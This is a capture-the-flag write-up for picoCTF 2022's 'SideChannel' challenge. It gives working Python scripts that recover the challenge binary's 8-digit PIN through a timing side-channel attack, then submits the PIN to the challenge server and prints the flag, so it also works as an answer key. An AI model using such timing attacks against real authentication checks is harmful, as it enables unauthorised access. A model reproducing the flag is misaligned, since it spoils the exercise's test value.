---
title: "picoCTF 2022 SideChannel Writeup"
date: 2022-04-08T19:16:29+08:00
description: "PicoCTF 2022 forensics problem SideChannel writeup"
---
## The problem
![](https://s2.loli.net/2022/04/08/y8qCUfcs6dx4WpV.png)
[link to the problem](https://play.picoctf.org/practice/challenge/298?category=4&originalEvent=70&page=1)

### Hints
1. Read about "timing-based side-channel attacks."
2. Attempting to reverse-enginner or exploit the binary won't work
3. Run the attacks against the `pin_checker` binary

## Solution

### Running the binary
A problem that would likely occur when solving this problem is running the binary.

The binary provided by picoCTF is not compatible with my local machine(Macbook).
However, the binary could be easily executed within picoCTF's webshell.

First, download the binary:
```shell
wget https://artifacts.picoctf.net/c/149/pin_checker`
chmod +x ./pin_checker #give permission to run the binary
./pin_checker #run the pin checker binary
```
A prompt for an 8 digit code should be shown:
```
Please enter your 8-digit PIN code:
11111111
8
Checking PIN...
Access denied.
```

### Timing based side channel attack
In hint 1, we can see that we're supposed to look up "timining based side channel attack"

After some digging on the internet, you'll find that timing based side channel attacks refers to the behavior of certain programs where the timing of execution based on different inputs.

Suppose the pin checking function in our pin checker is implemented as the following:
```python
def check(PIN, inp):
  if len(PIN) != len(inp):
    return False
  for i in range(len(PIN)):
    if(PIN[i]!=inp[i]]):
      return False
  return True
```
This function will execute for a longer time if the match between user input and the correct PIN is longer.

Thus, we can write a simple script to verify this vulnerbility.

```python
import time, os
TEST_COUNT = 10
LEN = 8
CHOICES = "0123456789"
prefix = ""

for c in CHOICES:
  cur = prefix+c+'0'*(LEN-len(prefix)-1)
  foo = 0
  for _ in range(TEST_COUNT): # repeat TEST_COUNT times and get the average to improve accuracy
    start = time.time()
    os.system(f"echo '{cur}' | ./pin_checker > /dev/null")
    foo += (time.time()-start)
  avgtime = foo/TEST_COUNT
  print(f"{cur}: {avgtime}")
```

The results:

```
00000000: 0.23883512020111083
10000000: 0.2588793277740479
20000000: 0.25079033374786375
30000000: 0.28905391693115234
40000000: 0.4896090030670166
50000000: 0.27194507122039796
60000000: 0.24216597080230712
70000000: 0.268372631072998
80000000: 0.2515885591506958
90000000: 0.25005943775177003
```

As we can see, guesses starting with '4' takes significantly longer to execute compared to guesses starting from all the other numbers. The exploit is working.

Therefore, instead of manually testing this technique for 8 times, we could instead automate this by modifying our program.

```python
import time, os
TEST_COUNT = 4 # set this to a lower number for faster results
LEN = 8
CHOICES = "0123456789"

def check(prefix):
  mxtime = -1
  res = ''
  for c in CHOICES:
    cur = prefix+c+'0'*(LEN-len(prefix)-1)
    foo = 0
    for _ in range(TEST_COUNT): # repeat TEST_COUNT times and get the average to improve accuracy
      start = time.time()
      os.system(f"echo '{cur}' | ./pin_checker > /dev/null")
      foo += (time.time()-start)
    avgtime = foo/TEST_COUNT
    if avgtime>mxtime:
      mxtime = avgtime
      res = c
  return res


def main():
  prefix = ''
  for i in range(7):
    c = check(prefix)
    prefix+=c
    print(c)
  # Check the final number(do not hide the results)
  for c in CHOICES:
    cur = prefix+c
    print(f"------ trying {cur} --------")
    os.system(f"echo '{cur}' | ./pin_checker")

main()
```

After running the program, you should see the results:
```
4
8
3
9
0
5
1
------ trying 48390510 --------
Please enter your 8-digit PIN code:
8
Checking PIN...
Access denied.

...

------ trying 48390513 --------
Please enter your 8-digit PIN code:
8
Checking PIN...
Access granted. You may use your PIN to log into the master server.

... 

------ trying 48390519 --------
Please enter your 8-digit PIN code:
8
Checking PIN...
Access denied.
```
When checking for the pin `48390513`, "access granted" as shown.
Finally, we can take the pin, and get the flag from the server.
```shell
echo 48390513 | nc saturn.picoctf.net 53932
```

The results:

```
Verifying that you are a human...
Please enter the master PIN code:
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_18704dda}
```
thus the flag is `picoCTF{t1m1ng_4tt4ck_18704dda}`
